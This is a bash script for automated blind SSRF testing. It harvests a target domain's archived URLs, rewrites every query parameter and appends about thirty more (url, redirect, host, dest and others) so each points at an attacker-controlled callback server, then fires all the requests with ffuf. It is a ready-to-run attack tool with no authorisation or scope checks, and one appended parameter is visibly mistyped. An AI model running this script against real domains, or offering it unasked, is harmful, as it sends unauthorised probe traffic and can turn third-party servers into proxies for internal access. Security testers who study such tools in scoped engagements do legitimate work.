#!/bin/bash

echo "Blind SSRF testing - append to parameters and add new parameters @hussein98d"
echo "Usage: bash script.sh domain.com http://server-callbak"
echo "This script uses https://github.com/ffuf/ffuf, https://github.com/lc/gau, https://github.com/tomnomnom/waybackurls"

if [ -z "$1" ]; then
	  echo >&2 "ERROR: Domain not set"
		  exit 2
fi
if [ -z "$2" ]; then
	  echo >&2 "ERROR: Sever link not set"
		  exit 2
fi

domain=$1
callback="$2/ssrf/$1/###"
workspace=$HACKING_RESULT/$domain/ssrf

if [ ! -d "$workspace" ]; then
	echo "[*] Making directory"
	mkdir -p "$workspace"
fi

echo "[*] Getting WaybackURLs"
waybackurls $domain > $workspace/urls.txt

echo "[*] Getting URLs with GAU"
gau $domain >> $workspace/urls.txt

echo "[*] Preprocessing urls file"
cat $workspace/urls.txt | sort | uniq | grep "?" | qsreplace $callback > $workspace/urls2.txt

sed -i "s|$|\&dest=$callback\&redirect=$callback\&uri=$callback\&path=$callback\&continue=$callback\&url=$callback\&window=$callback\&next=$callback\&data=$callback\&reference=$callback\&site=$callback\&html=$callback\&val=$callback\&validate=$callback\&domain=$callback\&callback=$callback\&return=$callback\&page=$callback\&feed=$callback\&host=$callback&\port=$callback\&to=$callback\&out=$callback\&view=$callback\&dir=$callback\&show=$callback\&navigation=$callback\&open=$callback|g" $workspace/urls2.txt

cat $workspace/urls2.txt | awk '{gsub("%23%23%23",NR,$0);print}' | awk '{gsub("###",NR,$0);print}' > $workspace/urls_final.txt

echo "[*] Firing the requests - check your server for potential callbacks"
ffuf -w $workspace/urls_final.txt -u FUZZ
